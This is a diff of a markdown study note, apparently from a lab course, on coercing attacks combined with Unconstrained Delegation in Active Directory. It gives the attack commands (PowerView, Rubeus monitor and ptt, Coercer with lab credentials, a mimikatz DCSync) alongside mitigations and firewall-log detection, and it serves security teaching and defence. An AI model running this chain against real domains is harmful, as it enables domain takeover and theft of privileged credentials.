@@ -1,4 +1,4 @@
-# 🔴 Coercing Attacks & Unconstrained Delegation
+<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/21a89151-f335-4f96-9e66-555197335139" /># 🔴 Coercing Attacks & Unconstrained Delegation
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ To identify systems configured for Unconstrained Delegation, we can use the Get-
 PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname
 ```
 
-<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/48e22b41-7132-42d2-8878-9101108b622f" />
+<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/53e00c68-e2f1-4844-8106-d1659dc41af9" />
 
 WS001 and SERVER01 are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start Rubeus in an administrative prompt to monitor for new logons and extract TGTs:
 
@@ -31,9 +31,9 @@ WS001 and SERVER01 are trusted for Unconstrained delegation (Domain Controllers 
 PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
 ```
 
-<img width="663" height="691" alt="image" src="https://github.com/user-attachments/assets/5ada1de6-52a1-4423-b7a6-2fbb0756decc" />
+<img width="652" height="688" alt="image" src="https://github.com/user-attachments/assets/7dbad7ab-e7dc-401e-9111-3d323db2e252" />
 
-<img width="1356" height="951" alt="image" src="https://github.com/user-attachments/assets/d6923d89-992e-4826-b0bc-8e8763003e47" />
+<img width="1356" height="951" alt="image" src="https://github.com/user-attachments/assets/cf4b6281-d227-48fa-92ab-07e41bbe4020" />
 
 Next, we need to know the IP address of WS001, which we can be obtain by running ipconfig. Once known, we will switch to the Kali machine to execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful:
 
@@ -41,15 +41,15 @@ Next, we need to know the IP address of WS001, which we can be obtain by running
 @htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
 ```
 
-<img width="676" height="737" alt="image" src="https://github.com/user-attachments/assets/c9303f3e-9a0e-4ec1-aa2a-dd5c990de329" />
+<img width="647" height="739" alt="image" src="https://github.com/user-attachments/assets/9deee84c-eea2-4dd6-9999-d8bf95631803" />
 
-<img width="2705" height="755" alt="image" src="https://github.com/user-attachments/assets/b6dd3231-4eae-4645-9468-0d105d00ea3a" />
+<img width="2705" height="755" alt="image" src="https://github.com/user-attachments/assets/418b2f07-5e76-4d26-8eb7-b47ba230d92e" />
 
 Now, if we switch to WS001 and look at the continuous output that Rubeus provide, there should be a TGT for DC1 available:
 
-<img width="646" height="553" alt="image" src="https://github.com/user-attachments/assets/f281ff56-fab0-48de-a94b-518c8a282165" />
+<img width="652" height="591" alt="image" src="https://github.com/user-attachments/assets/3d09bf55-b2f9-443e-a22d-6539e30fd286" />
 
-<img width="1420" height="875" alt="image" src="https://github.com/user-attachments/assets/cbc3b9c0-27b9-46cd-947a-c4a1744e7668" />
+<img width="1420" height="875" alt="image" src="https://github.com/user-attachments/assets/eafef9ef-9212-4afc-99ff-edb7e2e93968" />
 
 We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).
 
@@ -59,14 +59,16 @@ One way of using the abovementioned TGT is through Rubeus, as follows.
 PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
 ```
 
-<img width="624" height="618" alt="image" src="https://github.com/user-attachments/assets/5d0988bb-d5f1-4156-8319-20acf968b160" />
+<img width="614" height="597" alt="image" src="https://github.com/user-attachments/assets/f7d84415-064c-4f1f-befa-b26d17e16641" />
 
 Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.
 
 ```powershell
-PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"```
+PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
 
-<img width="475" height="834" alt="image" src="https://github.com/user-attachments/assets/c19a330c-b8da-4fb3-8d7e-effe7c6fe9a7" />
+<img width="507" height="863" alt="image" src="https://github.com/user-attachments/assets/1225f632-2127-48bc-93ed-ec8f2e358364" />
+
+```
 
 ---
 
@@ -77,23 +79,9 @@ Windows does not offer granular visibility and control over RPC calls to allow d
 * Implementing a third-party RPC firewall, such as the one from zero networks, and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous OPNUM associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
 * Block Domain Controllers and other core infrastructure servers from connecting to outbound ports 139 and 445, except to machines that are required for AD (as well for business operations). One example is that while we block general outbound traffic to ports 139 and 445, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)
 
-### 📌 Focused Defensive Measures
+In addition, organizations should regularly review systems configured for Unconstrained Delegation and remove the configuration where it is not required. Administrative access to systems trusted for Unconstrained Delegation should also be tightly restricted, especially for highly privileged accounts.
 
-#### 🛡️ Limit Unconstrained Delegation
-
-Regularly review systems configured for Unconstrained Delegation and remove it from systems where it is not required. Limiting the number of systems that can receive and cache TGTs reduces the available attack surface.
-
-#### 🛡️ Protect Domain Controllers
-
-Domain Controllers should have tightly restricted outbound network access. In particular, review and restrict unnecessary outbound SMB connections over ports 139 and 445 while preserving the connections required for legitimate Active Directory operations.
-
-#### 🛡️ Reduce Privileged Access
-
-Administrative access to systems configured for Unconstrained Delegation should be tightly controlled. Avoid using highly privileged accounts for routine administration on these systems where possible.
-
-#### 🔎 Audit Delegation Configuration
-
-Regularly audit Active Directory computer accounts for Unconstrained Delegation and investigate unexpected or newly introduced configurations.
+Domain Controllers and other core infrastructure servers should have restricted outbound SMB connectivity, while preserving the connections required for legitimate Active Directory operations. Regular auditing of delegation configuration and privileged access can also help identify unnecessary exposure.
 
 ---
 
@@ -103,13 +91,13 @@ As mentioned, Windows does not provide an out-of-the-box solution for monitoring
 
 A successful coercing attack with Coercer will result in the following host firewall log, where the machine at .128 is the attacker machine and the .200 is the Domain Controller:
 
-<img width="2419" height="1248" alt="image" src="https://github.com/user-attachments/assets/14790b8a-7971-41c7-95f6-1cd609058a77" />
+<img width="2419" height="1248" alt="image" src="https://github.com/user-attachments/assets/bae6aafd-d981-46f4-8ae6-1572ae08ec13" />
 
 We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.
 
 If we go forward and block outbound traffic to port 445, then we will observe the following behavior:
 
-<img width="1732" height="508" alt="image" src="https://github.com/user-attachments/assets/9398ac7a-51bd-459b-a74f-8305a46d752e" />
+<img width="1732" height="508" alt="image" src="https://github.com/user-attachments/assets/7296dae6-0265-4b67-ac2d-47b150c23d3e" />
 
 Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports 139 and 445 is recommended.
 
@@ -119,6 +107,6 @@ The above can also be used for detection, as any unexpected dropped traffic to p
 
 ## 🔑 Key Takeaway
 
-**Coercing Attacks & Unconstrained Delegation** means an attacker can abuse vulnerable RPC functions to force a Domain Controller to authenticate to a machine that is trusted for Unconstrained Delegation. The resulting TGT can then be captured and reused for authentication.
+**Coercing Attacks & Unconstrained Delegation** means an attacker abuses vulnerable RPC functions to force a Domain Controller to authenticate to a machine configured for Unconstrained Delegation. That authentication can result in the Domain Controller's TGT being cached on the compromised system and then reused by the attacker.
 
-The key security lesson is that **coercion becomes especially dangerous when combined with Unconstrained Delegation**, because a forced authentication can turn into reusable Kerberos credentials. Restricting delegation, protecting Domain Controllers, and monitoring unexpected SMB traffic can help reduce this attack path.
+The main security lesson is that **coercing attacks become especially dangerous when combined with Unconstrained Delegation**, because a forced authentication can expose reusable Kerberos credentials.
